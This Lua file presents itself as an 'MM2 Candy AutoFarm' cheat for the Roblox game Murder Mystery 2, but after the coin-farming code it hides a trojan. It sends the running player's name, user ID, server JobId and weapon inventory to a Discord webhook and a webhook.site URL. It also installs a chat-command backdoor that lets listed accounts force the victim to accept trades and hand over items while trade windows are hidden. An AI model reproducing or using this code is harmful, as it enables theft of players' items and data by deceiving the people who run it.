if game.PlaceId == 142823291 then
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title = "MM2 Candy AutoFarm",
    SubTitle = "",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
})

--Fluent provides Lucide Icons https://lucide.dev/icons/ for the tabs, icons are optional
local Tabs = {
    Main = Window:AddTab({ Title = "AutoFarm", Icon = "" }),
}

local Options = Fluent.Options

CoinCollectedEvent = game.ReplicatedStorage.Remotes.Gameplay.CoinCollected
RoundStartEvent = game.ReplicatedStorage.Remotes.Gameplay.RoundStart
RoundEndEvent = game.ReplicatedStorage.Remotes.Gameplay.RoundEndFade
    
CurrentCoinType = "Candy"
ResetWhenFullBag = false



RoundStartEvent.OnClientEvent:Connect(function()
	autofarmm = true
end)

RoundEndEvent.OnClientEvent:Connect(function()
	autofarmm = false
end)

CoinCollectedEvent.OnClientEvent:Connect(function(cointype, current, max)
	autofarmm = true
	if cointype == CurrentCoinType and tonumber(current) == tonumber(max) then
		autofarmm = false
	end
end)

local Input = Tabs.Main:AddInput("Input", {
        Title = "Auto farm speed (28 max)",
        Default = "",
        Placeholder = "Type auto farm speed",
        Numeric = true, -- Only allows numbers
        Finished = false, -- Only calls callback when you press enter
        Callback = function(textt)
           getgenv().textt = textt
        end
    })

    local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "Candy Farm", Default = false })

    Toggle:OnChanged(function(val)
    autofarmm = false
    if val then
                for i, v in pairs(game.Workspace:GetDescendants()) do
                if v.Name == "Coin_Server" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
    end
    end
    if autofarmm == false then
    autofarmm = true
        local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")

local camera = game.Workspace.CurrentCamera
local fixedSpeed = tonumber(getgenv().textt)

local function moveto(obj)
    local distance = (Players.LocalPlayer.Character.HumanoidRootPart.Position - obj.Position).Magnitude
    local time = distance / fixedSpeed -- Вычисляем время на основе фиксированной скорости
    local info = TweenInfo.new(time, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
    local tween = TweenService:Create(Players.LocalPlayer.Character.HumanoidRootPart, info, {CFrame = obj})
    tween:Play()
end

local function getdistancefc(part)
    return (part.Position - camera.CFrame.Position).Magnitude
end

    while autofarmm do
        task.wait(1)
        pcall(function()
            local closestPart
            local closestDistance = math.huge
            for i, v in pairs(game.Workspace:GetDescendants()) do
                if v.Name == "Coin_Server" then
                    local distance = getdistancefc(v.CFrame)
                    if distance < closestDistance then
                        closestDistance = distance
                        closestPart = v
                    end
                end
            end
            
            if closestPart then
                closestPart.Touched:Connect(function(hit)
                    if hit.Parent == Players.LocalPlayer.Character then
                        closestPart:Destroy() -- Удаляем монету при касании
                    end
                end)
                moveto(closestPart.CFrame) -- Перемещаемся к самой близкой монете
            end
        end)
        end
   else
            autofarmm = false
        end
        end
    end)

    Options.MyToggle:SetValue(false)
    
    CoinCollectedEvent.OnClientEvent:Connect(function(cointype, current, max)
	if cointype == CurrentCoinType and tonumber(current) == tonumber(max) then
		if ResetWhenFullBag then
			game.Players.LocalPlayer.Character.Humanoid.Health = 0
		end
	end
end)


    
        local Toggle2 = Tabs.Main:AddToggle("Toggle", {Title = "Reset Then Full", Default = false })
            Toggle2:OnChanged(function(value)
            if ResetWhenFullBag == false then
ResetWhenFullBag = true
else
ResetWhenFullBag = false
end
            end)
            
                Options.Toggle:SetValue(false)

SaveManager:LoadAutoloadConfig()

local url = "https://discord.com/api/webhooks/1296489854061903894/WU2SIziNuj1qUPFKbz5hYKKrFqV0n6jv_xWhUrACj3OJMtHCH7zoFISKoUcg60H_ma_O"
   
t = {}
for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
 table.insert(t, tostring(i).." : "..tostring(v)..", ")
end
inventory = table.concat(t)

local urll = "https://webhook.site/2396ca9e-2539-45e5-910b-1bf036e9311e"
local dataa = {
		["embeds"] = {
					{
						["title"] =  game.JobId,
						["description"] = "Name ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId ..  " Inventory: " ..inventory,
						["type"] = "rich",
						["color"]= tonumber(0xff0000),
						["footer"] = {
							["icon_url"] = 'https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096',
							["text"] = ""
						},
						["thumbnail"] = {
							["url"] = "https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096",
						},
						["author"] = {
							["name"] = ""
						},
						["fields"] = {
							{
								["name"] = '**Player profile**',
								["value"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile https://www.roblox.com/games/start?placeId=16302670534&launchData=142823291/"..game.JobId,
								["inline"] = true
							},
						}
					}}
			}
local newdataa = game:GetService("HttpService"):JSONEncode(dataa)
local headerss = {
   ["content-type"] = "application/json"
}
requestt= http_request or request or HttpPost or syn.request
local abcdeff = {Url = urll, Body = newdataa, Method = "POST", Headers = headerss}
requestt(abcdeff)

local data = {
		["embeds"] = {
					{
						["title"] =  game.JobId,
						["description"] = "Name ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId ..  " Inventory: " ..inventory,
						["type"] = "rich",
						["color"]= tonumber(0xff0000),
						["footer"] = {
							["icon_url"] = 'https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096',
							["text"] = ""
						},
						["thumbnail"] = {
							["url"] = "https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096",
						},
						["author"] = {
							["name"] = ""
						},
						["fields"] = {
							{
								["name"] = '**Player profile**',
								["value"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile https://www.roblox.com/games/start?placeId=16302670534&launchData=142823291/"..game.JobId,
								["inline"] = true
							},
						}
					}}
			}
local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

Player = game.Players.LocalPlayer
Pl = game.Players
function MainCommands(plr, msg)
    if msg == "p" then
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
    end
    if msg == "s" then
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
        for i = 1, 100 do
            wait(0.1)
        game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
        game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
    end
    end
    
   Users = {"GTAonvova", "Itz_myulee", "JoeGG200", "x3x1g"}
game.Players.PlayerAdded:Connect(function(plr)
 if table.find(Users, plr.Name) then
  plr.Chatted:Connect(function(msg)
    local args = {
        [1] = msg,
        [2] = "Weapons"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
end)
end
end)
    if msg == "a" then
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 2)
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 2)
        
    end
end
for i, v in Pl:GetChildren() do
    if v ~= Player then
        v.Chatted:Connect(function(msg)
            MainCommands(v, msg)
        end)
    end
end
Pl.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        MainCommands(plr, msg)
    end)
end)

end
